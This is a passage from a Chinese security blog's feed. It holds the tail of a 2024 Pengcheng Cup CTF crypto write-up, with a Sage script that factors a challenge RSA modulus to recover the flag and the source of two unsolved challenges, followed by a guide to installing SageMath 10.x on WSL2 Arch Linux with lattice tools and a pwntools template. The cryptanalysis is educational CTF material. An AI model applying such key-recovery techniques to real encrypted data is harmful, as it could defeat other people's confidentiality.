class="line">    reduced_polynomials.append(g_l)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eliminate z</span></span><br><span class="line">my_ideal_list = [y * z - N] + reduced_polynomials</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Variety</span></span><br><span class="line">my_ideal_list = [Hi.change_ring(QQ) <span class="keyword">for</span> Hi <span class="keyword">in</span> my_ideal_list]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_ideal_list),<span class="number">3</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    V = Ideal(my_ideal_list[:i]).variety(ring=ZZ)</span><br><span class="line">    <span class="keyword">if</span> V:</span><br><span class="line">        p = <span class="built_in">int</span>(V[<span class="number">0</span>][<span class="string">&#x27;y&#x27;</span>])</span><br><span class="line">        q = N//p</span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">        d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>确实是没有想到，比赛时方向一直卡在<code>crtrsa</code>，没太往<code>dp</code>泄露这边想</p><p>下面挂的是还没打出来的密码题，都大致看了一眼，当时时间不够了，一堆事围着我，吐了吐了，还是太菜了，不够快</p><h2 id="UNSOLVED"><a href="#UNSOLVED" class="headerlink" title="UNSOLVED"></a>UNSOLVED</h2><h3 id="polyprime-pcb2024"><a href="#polyprime-pcb2024" class="headerlink" title="polyprime-pcb2024"></a>polyprime-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">k = getPrime(<span class="number">333</span> * <span class="number">5</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_calc</span>(<span class="params">x</span>): </span><br><span class="line">    <span class="keyword">return</span> (x * random.randint(<span class="number">2</span>, <span class="number">5</span>)) ^ random.randint(<span class="number">100</span>, <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">some_calc</span>(<span class="params">size, depth</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sums_calc</span>(<span class="params">base, degree</span>): </span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degree): </span><br><span class="line">            temp = temp_calc(base ** i)</span><br><span class="line">            result += base ** i + temp // temp_calc(base**(i + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime_number = getPrime(size)</span><br><span class="line"></span><br><span class="line">        temp_number = temp_calc(prime_number)</span><br><span class="line">        poly_primes = sums_calc(prime_number, depth)  </span><br><span class="line">        <span class="keyword">if</span> temp_number % <span class="number">3</span> == <span class="number">0</span>: </span><br><span class="line">            temp_number = temp_calc(poly_primes)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> isPrime(poly_primes):</span><br><span class="line">            <span class="keyword">return</span> prime_number, poly_primes</span><br><span class="line"></span><br><span class="line">p, q = some_calc(<span class="number">333</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n = p * q * k</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 659401821142664131364043958430747314465977448744532421905138184036743766362324320051729418680079590835903781525157600055608268591994754328563246418114269690475272262915661210669701969695314157602927462228079044905276064391615467601628466982949165371933147600418057089432876120807721483665788557812323607370950442342057254926375842684430119320789097029996211564275310819486004520088130146630452262340185192110066151930586956190499953220051855668474863659201165952231016814569364299000130323859609047687714260776467149437031397019411599103716200258382231589757031469168245396061619327867355414287059363691024984066070128364157490336808211223714816668548049472199794493895870662970541167490686648385211854469386812214775829776376273299648505880034651930322294605482489225723014758138525637864689594748771025870209444029669477294995691067669374491852721622469656239730320092112222948718027850386898461208936333788173263904607181823233002355650353116486156927403178510412091666951574340730799316032588099237</span></span><br><span class="line"><span class="comment"># c = 455042981325030540026829365098432813829591020497037525707600104817313008442900331256387443469027825344761381076471749826547710666806180999603254398722965179851898391700090501419875562919365894255855734276825027850795202733875071307773598881254863911398285400038957998385685292965812925607278232164067624548120378758414574370042945538632864154772437639053907149514588502689277630450575630168099810584842881257614115970132960679023265157277718654731105815060916800751033956715430930381384344469220951638102432198422350425390757155267143393385221465041749156153517556389417033187856017198907366720281408810250981776112815100319814215140919133440637395953567624057248002125277569474190364142291136361144552953540727462623677375371327473687508344483184466522697912317252462246054471196345909304668083637177166153036111122244170846815657389873986264187766636830907458940128844256504176917204131708083105093700023335939233711693409336968008112511482237441198116493965744903995545941700742865846469036763734618</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br></pre></td></tr></table></figure><h3 id="rickroll-pcb2024"><a href="#rickroll-pcb2024" class="headerlink" title="rickroll-pcb2024"></a>rickroll-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HINT = ?</span><br><span class="line">FLAG = <span class="string">&quot;flag&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">EFFECTIVE_ROW = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rickroll_loader</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rickroll&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = [line.strip().encode() <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> line.strip()]</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_ezprime</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime = getPrime(size)</span><br><span class="line">        <span class="keyword">if</span> isPrime(prime // <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_encrypt</span>(<span class="params">message_parts, hint_value</span>):</span><br><span class="line">    modulus = find_ezprime(<span class="number">260</span>)</span><br><span class="line"></span><br><span class="line">    key_material = os.urandom(<span class="number">32</span>)</span><br><span class="line">    multipliers = [getrandbits(<span class="number">256</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(EFFECTIVE_ROW)]</span><br><span class="line"></span><br><span class="line">    encrypted_parts = [</span><br><span class="line">        <span class="built_in">int</span>((multiplier * hint_value + bytes_to_long(xor(pad(chunk, <span class="number">32</span>)</span><br><span class="line">            [::-<span class="number">1</span>], key_material))) % (modulus - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> multiplier, chunk <span class="keyword">in</span> <span class="built_in">zip</span>(multipliers, message_parts)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_parts, multipliers, modulus</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    rickroll = rickroll_loader()</span><br><span class="line">    m = bytes_to_long(HINT)</span><br><span class="line"></span><br><span class="line">    encrypted_lyrics, multipliers, modulus = secure_encrypt(</span><br><span class="line">        rickroll[:EFFECTIVE_ROW], m)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;S =&quot;</span>, encrypted_lyrics)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;V =&quot;</span>, multipliers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, modulus)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">S = [624073892368439332713131144655355187273652775732037030273908973687487472640419, 1129513550732743550887354593625951854836036688324123410864182971141396110133306, 1117643028354341949186759218964558582164677605237787761003042032239935547551873, 151619055620013230556169740951169935393567570823439146992800622058967940011364, 596106506159944398847755500086869373163910176213091804211992440336880292610397, 685472210701608040945173323626153641749419080165879222271110177606156013942182]</span></span><br><span class="line"><span class="string">V = [100024809269721744282017864103544473542698741247649693420201028956644193231147, 85493218764912449360009112267171851264674952927507787108286827385372626006804, 75451455656190167222034904545925816909383290106210237096763781707294423744719, 1864420400658866895837249178680154965580281261003086054650703872439476331244, 111069754111223622246512532174936637994215526100226395068812327641951277359169, 88031405587803201423744918486788030404029698214504194443110805396831023823738]</span></span><br><span class="line"><span class="string">n = 1497114501625523578039715607844306226528709444454126120151416887663514076507099</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rickroll</span></span><br><span class="line"></span><br><span class="line">Never gonna give you up</span><br><span class="line">Never gonna let you down</span><br><span class="line">Never gonna run around <span class="keyword">and</span> desert you</span><br><span class="line"></span><br><span class="line">Never gonna make you cry</span><br><span class="line">Never gonna say goodbye</span><br><span class="line">Never gonna tell a lie <span class="keyword">and</span> hurt you</span><br><span class="line"></span><br><span class="line">--A mysterious singer who does <span class="keyword">not</span> want to be named.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>还得找个时间补一下，中大爷<code>Lst4r</code>干了五题，QWQ<br>（希望可以去线下玩玩吧</p><p>听说<code>web</code>有人AK了，指个路<br><a href="https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/">https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&quot;SOLVED&quot;&gt;&lt;a href=&quot;#SOLVED&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SageMath10.x最新版安装指引</title>
    <link href="https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/"/>
    <id>https://hvang10.github.io/2024/11/07/SageMath10-x%E6%9C%80%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E6%8C%87%E5%BC%95/</id>
    <published>2024-11-06T17:47:23.000Z</published>
    <updated>2025-09-07T09:09:29.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言-2024-11-7"><a href="#前言-2024-11-7" class="headerlink" title="前言(2024.11.7)"></a>前言(2024.11.7)</h1><p>由于懒人安装在<code>windows11</code>上面，最高只能获取到<code>Sagemath9.3</code>的版本，在<code>wsl2+ubuntu22.04</code>上面最新的也才<code>sagemath9.5</code>好像，不会升级，有些<code>exp</code>跑不了，遂安装了<code>Sagemath10.x</code>版本</p><p>在网上找了一圈，发现都没有教程是使用<code>WSL2+ubuntu22.04+sagemath10.x</code>的，很多都是在<code>Arch Linux</code>里面装的</p><p>特此，安装好了，可以运行了，写下了这篇博客</p><p>闲来无事，去敲打了一下<code>Kimi</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SageMath 10.x 版本推荐使用 Arch Linux 的原因主要有以下几点：</span><br><span class="line">维护良好且最新的SageMath包：从Sage 10.2开始，Arch Linux 提供了维护良好且最新的SageMath包，这意味着用户可以更容易地获得最新版本的SageMath，以及及时的安全更新和功能改进。</span><br><span class="line">兼容性和支持：Arch Linux 对于 SageMath 的支持较好，社区活跃，能够及时解决与SageMath 相关的兼容性问题</span><br><span class="line">滚动更新模型：Arch Linux 采用滚动更新模型，这意味着系统和软件包始终保持最新状态，这对于科研和开发人员来说是一个很大的优势，因为他们可以快速获得最新的软件和库</span><br><span class="line"></span><br><span class="line">用户推荐：有用户因为个人使用体验良好而推荐在 Arch Linux 下安装 SageMath。他们可能觉得在 Arch Linux 下使用 SageMath 更为方便，尤其是在 WSL2 环境下。</span><br><span class="line">从源代码安装的便利性：Arch Linux 的文档中提到，Sage源代码树包含符号链接，如果使用Windows行结束而不是UNIX行结束，构建将无法工作。这表明在Arch Linux（一个UNIX-like系统）上从源代码安装SageMath更为便利</span><br><span class="line"></span><br><span class="line">包管理器支持：SageMath 可以从各种发行版获得，并且可以由包管理器安装。Arch Linux 的包管理器 pacman 使得安装和更新 SageMath 变得简单</span><br><span class="line"></span><br><span class="line">综上所述，Arch Linux 提供了最新的SageMath包、良好的社区支持、滚动更新模型以及从源代码安装的便利性，这些因素共同使得它成为运行 SageMath 10.x 版本的推荐选择</span><br></pre></td></tr></table></figure><p>我的评价是，<code>Arch Linux</code>能用<strong>最新版！</strong><br>本来是想参考<a href="https://tover.xyz/p/SageMath-10-1-Installation/">师兄</a>的，发现还是做不到啊，死在了<code>conda</code>上，原因未知</p><h1 id="安装wsl2-Arch-Linux"><a href="#安装wsl2-Arch-Linux" class="headerlink" title="安装wsl2+Arch Linux"></a>安装wsl2+Arch Linux</h1><p><code>wsl2</code>的安装的话，参考网上的教程，一大堆</p><p>然后，在微软商城下载<code>Arch WSL</code>，打开之后就是用户名密码的配置<br>非默认系统的情况下，<code>wsl -d Arch</code>进入<code>Arch Linux</code></p><p><code>wsl --list</code>可以看到当前有什么<code>适用于 Linux 的 Windows 子系统分发</code><br>设为默认子系统，可以将<code>Arch</code>换成别的，比如<code>Ubuntu-22.04</code><br><code>wsl --set-default Arch</code></p><h1 id="配置pacman"><a href="#配置pacman" class="headerlink" title="配置pacman"></a>配置pacman</h1><p>(很强大的包管理器)<br>配置pacman镜像源，也就是换源(因为自身的源太慢了，或者因为是国外的，用不了，得换成国内的镜像源，比如阿里源、清华源等)<br><code>sudo su</code>进入<code>root</code>模式<br><code>vim /etc/pacman.d/mirrorlist</code><br>在顶部增加</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = http://repo.archlinuxcn.org/<span class="variable">$arch</span></span><br><span class="line">Server = http://mirrors.163.com/archlinux-cn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.aliyun.com/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>更新系统，输入<code>pacman -Syu</code>，不知道梯子有没有影响(有时候开梯子很慢)，看情况是否把梯子关闭吧</p><p>配置<code>pacman key</code>，输入以下命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line">pacman-key --populate</span><br><span class="line">pacman -Sy archlinux-keyring</span><br></pre></td></tr></table></figure><p>更新系统<code>pacman -Syu</code>，为什么这里又更新呢，因为这一步是必须的，上一步如果配置<code>pacman key</code>出现网络问题，更新系统就能解决，如果没有就不用更新系统了</p><p>如果源用不了(换了源之后的情况)，比如<code>Could not resolve host</code>，可能是<code>DNS</code>出了点问题(?)，经验告诉我是这样的，<code>vim /etc/resolv.conf</code>，增加<code>nameserver 8.8.8.8</code>，这个是谷歌的<code>DNS</code>服务器，也可以再加多一个<code>nameserver 114.114.114.114</code>，可以把原来的那个本地的删了，应该没有什么问题()</p><p>出现了个问题，在<code>Arch Linux</code>里面配置禁止重启自动更新的话是有问题的(同样的操作在ubuntu是没有任何问题的)，表现为<code>/etc/resolv.conf</code>文件不存在。。。所以在<code>Arch Linux</code>里面就不要配置这个了，有问题再加谷歌的<code>DNS</code>服务器</p><p>配置<code>archlinuxcn</code>镜像源，<code>vim /etc/pacman.conf</code>，增加以下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>安装<code>archlinuxcn</code>的<code>key</code>，<code>pacman -Sy archlinuxcn-keyring</code></p><p>这两个<code>key</code>吧，我也不知道有没有配置成功，输入命令之后好像没反应，总感觉没有成功一样的(?)</p><p>继续安装后面的<code>sage</code>，完成之后既然没有出现问题，那就不管它了</p><h1 id="安装sage"><a href="#安装sage" class="headerlink" title="安装sage"></a>安装sage</h1><p><code>sudo pacman -Sy sagemath</code><br><strong>请耐心耐心再耐心等待，好几个G呢！！！</strong><br>运行<code>sage</code>，看看是否安装成功<br><img src="https://picx.zhimg.com/80/v2-700679ee72ed9b6dd33bbfcc1c956af7_1440w.png" alt=""><br>可以看到都是最新版，这下好玩了<br>如果需要管理<code>sage</code>，它的文件路径是<code>Arch\usr\lib\python3.12\site-packages\sage</code></p><h1 id="安装JupyterLab-推荐"><a href="#安装JupyterLab-推荐" class="headerlink" title="安装JupyterLab(推荐)"></a>安装JupyterLab(推荐)</h1><p><code>sudo pacman -S jupyterlab</code></p><h1 id="在JupyterLab中启动Sage"><a href="#在JupyterLab中启动Sage" class="headerlink" title="在JupyterLab中启动Sage"></a>在JupyterLab中启动Sage</h1><p><code>sage -n jupyterlab --allow-root</code><br>按道理来说不指定浏览器，你点击它之后会自动跳到默认浏览器的，但是我这里跳到了<code>Edge</code>浏览器，不是我默认的火狐浏览器</p><p>也懒得改了，直接浏览器输入<code>http://localhost:8888/lab</code><br>通常我们是不记指令的，那么我们来搞一个<code>bash</code>脚本快速启动，其实就是把这条指令丢进去<br>在工作目录下，比如我的<code>/mnt/d/desktop</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">vim sage.sh</span><br><span class="line"><span class="comment"># 输入以下两行的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">sage -n jupyterlab --allow-root</span><br></pre></td></tr></table></figure><p>保存退出之后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x sage.sh</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">./sage.sh</span><br></pre></td></tr></table></figure><p>所以，平时我们需要使用<code>sagemath</code>的时候，在我们的工作目录下面<code>./sage.sh</code>即可启动</p><h1 id="导入一些库"><a href="#导入一些库" class="headerlink" title="导入一些库"></a>导入一些库</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo pacman -S python-&lt;package_name&gt; [python-&lt;package_name&gt;]</span></span><br><span class="line"><span class="comment"># 温馨提示：有的库没法安装是因为Arch里边没有而已，整个pip并用pip3安装即可</span></span><br><span class="line">sudo pacman -S python-gmpy2 python-pycryptodome python-pwntools python-tqdm</span><br></pre></td></tr></table></figure><p>后续还有<code>python</code>其他的库需要安装，可以参考上面的格式<code>python-xxxx</code>，也可以去整个<code>pip</code>，目前来说这些是够了的(只打ctf crypto方向，应该够)，好像它内置就挺多了的</p><p>最舒服的就是，你在<code>windows</code>下面下载的<code>pwntools</code>，可能过了一阵子，等你又安装了别的什么什么东西，可能是一些依赖项冲突了，会导致你<code>from pwn import *</code>无法使用</p><p>所以我的解决方案是在<code>Linux</code>里面下载<code>pwntools</code>(环境隔绝)，在<code>Linux</code>里面执行<code>python</code>脚本就好了，就像这里<code>Arch Linux</code>的<code>pwntools</code>就不会起冲突，可以正常使用</p><p>有的萌新可能第一次接触<code>crypto</code>方向的容器题，可能有点难上手，现提供一个板板</p><p>密码学方向环境题(通俗一点来说，就是打远程)的交互脚本模板如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 连接服务</span></span><br><span class="line">p = remote(<span class="string">&#x27;host&#x27;</span>, port)</span><br><span class="line"><span class="comment"># 记录调试信息</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># 接收服务器端的信息，识情况而选</span></span><br><span class="line">a = p.recvline()</span><br><span class="line">p.recvlines(n)</span><br><span class="line">p.recvall()</span><br><span class="line">p.recv(n)   <span class="comment"># 接收n字节</span></span><br><span class="line">p.recvuntil(delim)  <span class="comment"># 一直接收，直到delim为止</span></span><br><span class="line"><span class="comment"># 发送信息给服务器端，识情况而选</span></span><br><span class="line">p.send(string)</span><br><span class="line">p.sendafter(string,payload) <span class="comment"># 接收到string后发送</span></span><br><span class="line">p.sendline(string)    <span class="comment">#   末尾有 \n</span></span><br><span class="line">p.sendlineafter(string,payload)</span><br><span class="line"><span class="comment"># 保持交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是接收和发送的数据类型都是字节数据，比如<code>b&#39;hello&#39;</code></p><h1 id="安装flatter-可以加速格基规约"><a href="#安装flatter-可以加速格基规约" class="headerlink" title="安装flatter(可以加速格基规约)"></a>安装flatter(可以加速格基规约)</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gmp mpfr eigen base-devel gcc git cmake</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/keeganryan/flatter.git</span><br><span class="line"><span class="built_in">cd</span> flatter</span><br><span class="line"><span class="built_in">mkdir</span> build &amp;&amp; <span class="built_in">cd</span> ./build</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig <span class="comment">#这个可以不输入</span></span><br></pre></td></tr></table></figure><p><code>flatter -h</code>查看是否能正常使用</p><h1 id="代码补全功能"><a href="#代码补全功能" class="headerlink" title="代码补全功能"></a>代码补全功能</h1><p>路径：<code>Setting-&gt;Setting Editer-&gt;Code Completion</code><br><img src="https://picx.zhimg.com/80/v2-94dfe83b491d36a5837bfb8a7be17f6c_1440w.webp" alt=""><br>感觉函数解释是不需要的，有点碍眼睛<br><img src="https://picx.zhimg.com/80/v2-2bd85de9329534e40610f5c15c15c6a7_1440w.png" alt=""><br>测试运行</p><h1 id="2025-9-7续"><a href="#2025-9-7续" class="headerlink" title="2025.9.7续"></a>2025.9.7续</h1><h2 id="cuso-copper-solver"><a href="#cuso-copper-solver" class="headerlink" title="cuso(copper solver)"></a>cuso(copper solver)</h2><p><a href="https://github.com/keeganryan/cuso">github链接</a></p><p>确保前面的<code>flatter</code>可用，要是<code>flatter -h</code>不正常，重新再弄一次即可(我就重新弄了一次)<br>还需要<code>msolve</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/algebraic-solving/msolve</span><br><span class="line">sage -sh</span><br><span class="line"><span class="built_in">cd</span> msolve</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><code>msolve- v</code>检查一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/keeganryan/cuso.git</span><br><span class="line">sage -sh</span><br><span class="line"><span class="built_in">cd</span> cuso/</span><br><span class="line">sudo pacman -S python-pip</span><br><span class="line">pip install . --break-system-packages</span><br></pre></td></tr></table></figure><p><strong>sage脚本</strong>运行一下<code>from cuso import find_small_roots</code>试试，看看是否可以正常运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">relations: 关系式</span><br><span class="line">bounds: 界限</span><br><span class="line">modulus: 模数</span><br><span class="line">modulus_multiple: 模数的幂次</span><br><span class="line">modulus_lower_bound: 模数的最低</span><br></pre></td></tr></table></figure><p>再<strong>具体</strong>的用法可参考<br><a href="http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/">http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/</a></p><p>这篇<strong>wp</strong>也多次使用到了<strong>cuso</strong><br><a href="https://languag3.github.io/2025/08/25/nss4th">https://languag3.github.io/2025/08/25/nss4th</a></p><h2 id="再补充一个"><a href="#再补充一个" class="headerlink" title="再补充一个"></a>再补充一个</h2><p>比如<a href="https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver">MT19937</a>，这种可以直接导入的包(放在<strong>同一目录下</strong>)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver</span></span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://shinichicun.top/posts/arch%E4%B8%8B%E7%9A%84sage%E5%AE%89%E8%A3%85/">https://shinichicun.top/posts/arch%E4%B8%8B%E7%9A%84sage%E5%AE%89%E8%A3%85/</a><br><a href="https://zhuanlan.zhihu.com/p/633782050">https://zhuanlan.zhihu.com/p/633782050</a><br><a href="http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/">http://n1gh7ma12e.cn/2025/08/25/Crypto%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%AF%87/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言-2024-11-7&quot;&gt;&lt;a href=&quot;#前言-2024-11-7&quot; class=&quot;headerlink&quot; title=&quot;前言(2024.11.7)&quot;&gt;&lt;/a&gt;前言(2024.11.7)&lt;/h1&gt;&lt;p&gt;由于懒人安装在&lt;code&gt;windows11&lt;/code</summary>
      
    
    
    
    
  </entry>
  
</feed>
